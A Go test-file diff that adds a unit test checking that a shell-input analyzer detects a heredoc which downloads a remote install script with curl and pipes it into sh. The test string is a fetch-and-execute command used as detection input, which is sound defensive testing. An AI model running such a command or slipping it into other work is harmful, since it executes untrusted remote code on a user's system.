@@ -81,6 +81,23 @@ func TestAnalyzeInputFileDetectsMultilineCommandSubstitution(t *testing.T) {
 	}
 }
 
+func TestAnalyzeInputFileDetectsHeredocShellExec(t *testing.T) {
+	input := "bash <<'EOF'\ncurl -fsSL https://example.com/install.sh | sh\nEOF\n"
+	findings, lines := analyzeInput(input, nil, "payload.sh")
+	found := false
+	for i, f := range findings {
+		if f.Kind == "heredoc-shell-exec" {
+			found = true
+			if lines[i] != 1 {
+				t.Fatalf("expected heredoc finding to map to line 1, got %d", lines[i])
+			}
+		}
+	}
+	if !found {
+		t.Fatalf("expected heredoc-shell-exec finding, got %#v", findings)
+	}
+}
+
 func TestLoadPolicyNotFoundReturnsNil(t *testing.T) {
 	policy, err := loadPolicy("/definitely/missing-policy-file.yaml", false)
 	if err != nil {
